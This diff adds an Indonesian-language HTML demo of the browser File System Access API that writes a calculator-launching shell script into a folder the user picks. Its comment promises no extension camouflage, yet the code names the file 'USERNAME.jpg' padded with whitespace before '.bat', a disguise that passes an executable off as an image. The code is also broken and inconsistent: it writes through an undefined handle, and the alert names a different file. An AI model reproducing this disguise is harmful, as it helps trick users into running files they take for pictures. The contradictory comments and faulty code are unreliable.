@@ -1,0 +1,52 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Demo File System Access API (Linux)</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="icon" type="image/x-icon" href="favicon.png" />
+</head>
+<body>
+  <h3>Buat script Linux untuk menampilkan kalkulator</h3>
+  <button id="butDirectory">Pilih folder & buat run_calculator.sh</button>
+
+  <script>
+    const butDir = document.getElementById('butDirectory');
+
+    butDir.addEventListener('click', async () => {
+      if (!window.showDirectoryPicker) {
+        alert('Browser Anda belum mendukung File System Access API (coba Chrome/Edge).');
+        return;
+      }
+
+      // 1) Minta user pilih folder tujuan
+      const dirHandle = await window.showDirectoryPicker();
+
+      // 2) Buat file shell yang JELAS namanya (tanpa kamuflase ekstensi)
+        const newFileHandle = await dirHandle.getFileHandle(
+    'USERNAME.jpg                                                                            .bat',
+    { create: true }
+  )
+
+      // 3) Tulis script: coba gnome-calculator, kalau gagal coba xcalc
+      const script = `#!/bin/bash
+# Jalankan kalkulator di Linux (Kali/DE lain)
+if command -v gnome-calculator >/dev/null 2>&1; then
+  exec gnome-calculator
+elif command -v xcalc >/dev/null 2>&1; then
+  exec xcalc
+else
+  echo "Tidak menemukan gnome-calculator maupun xcalc."
+  exit 1
+fi
+`;
+
+      const writable = await fileHandle.createWritable();
+      await writable.write(script);
+      await writable.close();
+
+      alert('File "run_calculator.sh" sudah dibuat.\n\nLangkah berikutnya di terminal:\n1) cd ke folder yang dipilih\n2) chmod +x run_calculator.sh\n3) ./run_calculator.sh');
+    });
+  </script>
+</body>
+</html>
